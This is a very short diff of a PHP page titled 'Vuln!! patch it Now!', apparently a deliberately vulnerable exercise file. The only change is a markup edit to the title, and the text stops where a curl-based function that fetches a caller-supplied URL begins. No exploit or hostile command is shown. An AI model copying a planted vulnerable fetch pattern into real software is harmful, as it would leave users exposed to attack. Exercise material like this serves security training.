@@ -1,4 +1,4 @@
-<head><title>Vuln!! patch it Now!</title></head>
+<title>Vuln!! patch it Now!</title>
 <?php
 function http_get($url){
 	$im = curl_init($url);
